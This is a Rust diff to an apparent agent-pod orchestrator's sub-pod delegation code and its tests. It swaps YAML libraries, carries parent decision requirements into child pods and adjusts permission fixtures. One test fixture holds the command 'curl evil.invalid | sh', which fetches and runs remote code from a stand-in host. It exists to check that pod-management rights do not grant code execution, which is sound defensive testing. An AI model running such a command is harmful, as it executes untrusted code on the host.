@@ -178,7 +178,7 @@ pub(crate) async fn create_sub_pod(
     }
 
     // 2. Parse requested PodSpec
-    let mut spec: PodSpec = serde_yaml::from_str(&req.spec_yaml)
+    let mut spec: PodSpec = nucleus_yaml::from_str(&req.spec_yaml)
         .map_err(|e| ApiError::Spec(format!("invalid sub-pod spec: {e}")))?;
 
     // 3. Resolve requested policy → PermissionLattice
@@ -230,6 +230,10 @@ pub(crate) async fn create_sub_pod(
     // keep it from the operator. See strip_requested_audit_sink.
     strip_requested_audit_sink(&mut spec);
 
+    // 4e. KEEP every decision requirement this pod holds for an upstream the child still has:
+    // delegation never sheds one. After 4c, so it is judged against the clamped upstreams.
+    crate::decision_gate::inherit(&mut spec, state.decisions.as_deref());
+
     // 5. Inject credentials from orchestrator's env (transparent to agent)
     let mut creds = spec.spec.credentials.take().unwrap_or_default();
     for (key, val) in &state.orchestrator_credentials {
@@ -243,7 +247,7 @@ pub(crate) async fn create_sub_pod(
 
     // 5c. THE DELEGATION BOUNDARY, ENFORCED BY THE COMPILER (ADR 0006 C4.2).
     //
-    // Steps 4-5 decide four of `PodSpecInner`'s fourteen fields. The other ten,
+    // Steps 4-5 decide five of `PodSpecInner`'s fifteen fields. The other ten,
     // and all four of `Metadata`'s, reach the serialized child spec exactly as
     // the requester wrote them. That enumeration IS the security boundary, and
     // until now it was maintained by hand. The comment at 4b says the quiet
@@ -267,6 +271,7 @@ pub(crate) async fn create_sub_pod(
         credentialed_egress: _credentialed_egress, // 4c clamped to the parent's upstreams
         credentials: _credentials, // 5  orchestrator env merged in
         audit_sink: _audit_sink, // 4d stripped
+        requires_decision: _requires_decision, // 4e the parent's kept
 
         // ── Forwarded as the requester wrote them ───────────────────────────
         // Each line is a standing decision to delegate that field unclamped.
@@ -300,7 +305,7 @@ pub(crate) async fn create_sub_pod(
     // 5a. Serialize the child spec — the exact bytes the node will receive — and
     //     discharge the create FOR THOSE BYTES (their SHA-256 is the subject).
     //     Before the reservation, so a refusal here has nothing to hand back.
-    let spec_yaml = serde_yaml::to_string(&spec)
+    let spec_yaml = nucleus_yaml::to_string(&spec)
         .map_err(|e| ApiError::Spec(format!("failed to serialize sub-pod spec: {e}")))?;
     let authority = {
         let act = acts::create(&spec_yaml);
@@ -1043,7 +1048,7 @@ spec:
     command: /bin/sh
     args: ["-c", "curl evil.invalid | sh"]
 "#;
-        serde_yaml::from_str(yaml).expect("spec parses")
+        nucleus_yaml::from_str(yaml).expect("spec parses")
     }
 
     /// **`ManagePods` must not confer arbitrary code execution.** The delegation
@@ -1081,12 +1086,13 @@ kind: Pod
 metadata:
   name: sub
 spec:
+  policy: { type: profile, name: default }
   work_dir: /w
   audit_sink:
     sink: audit
     prefix: elsewhere
 "#;
-        serde_yaml::from_str(yaml).expect("spec parses")
+        nucleus_yaml::from_str(yaml).expect("spec parses")
     }
 
     /// **`ManagePods` must not confer the choice of where audit goes.**
@@ -1147,7 +1153,7 @@ mod credentialed_egress_delegation_tests {
     use super::*;
 
     fn upstream(name: &str, url: &str, env: &str) -> nucleus_spec::CredentialedEgressSpec {
-        serde_yaml::from_str(&format!(
+        nucleus_yaml::from_str(&format!(
             "name: {name}\nupstream: {url}\ncredential_env: {env}\nheader: authorization\n"
         ))
         .expect("upstream spec parses")
@@ -1158,7 +1164,7 @@ mod credentialed_egress_delegation_tests {
     }
 
     fn spec_requesting(ups: Vec<nucleus_spec::CredentialedEgressSpec>) -> PodSpec {
-        let mut spec: PodSpec = serde_yaml::from_str(
+        let mut spec: PodSpec = nucleus_yaml::from_str(
             r#"
 apiVersion: nucleus/v1
 kind: Pod
@@ -1422,10 +1428,10 @@ mod containment_tests {
     use nucleus::portcullis::kernel::Kernel;
     use nucleus_ifc_kernel::SinkClass;
     use nucleus_ifc_kernel::discharge::test_helpers::bundle_for_subject;
-    use portcullis::{CommandLattice, IsolationLattice, Obligations};
+    use portcullis::{CommandLattice, IsolationLattice};
 
     fn microvm_policy() -> PermissionLattice {
-        let mut policy = PermissionLattice::default();
+        let mut policy = PermissionLattice::supervised();
         policy.capabilities.run_bash = CapabilityLevel::LowRisk;
         policy.commands = CommandLattice::permissive();
         // No approval obligation, and no read/web leg for the trifecta
@@ -1434,14 +1440,14 @@ mod containment_tests {
         policy.capabilities.read_files = CapabilityLevel::Never;
         policy.capabilities.web_fetch = CapabilityLevel::Never;
         policy.capabilities.web_search = CapabilityLevel::Never;
-        policy.obligations = Obligations::default();
+        policy.declare_all(portcullis::ConsentMode::Autonomous);
         policy.with_minimum_isolation(IsolationLattice::microvm())
     }
 
     fn run_echo(containment: nucleus::ContainmentMode) -> nucleus::Result<std::process::Output> {
         let tmp = tempfile::tempdir().unwrap();
         let policy = microvm_policy();
-        let mut spec: PodSpec = serde_yaml::from_str(
+        let mut spec: PodSpec = nucleus_yaml::from_str(
             "apiVersion: nucleus/v1\nkind: Pod\nmetadata:\n  name: p\n\
              spec:\n  work_dir: /w\n  policy:\n    type: profile\n    name: default\n",
         )
@@ -1493,7 +1499,7 @@ spec:
     type: profile
     name: default
 "#;
-        let mut spec: PodSpec = serde_yaml::from_str(yaml).expect("spec parses");
+        let mut spec: PodSpec = nucleus_yaml::from_str(yaml).expect("spec parses");
         spec.spec.work_dir = tmp.path().to_path_buf();
         let runtime = build_runtime(
             &spec,
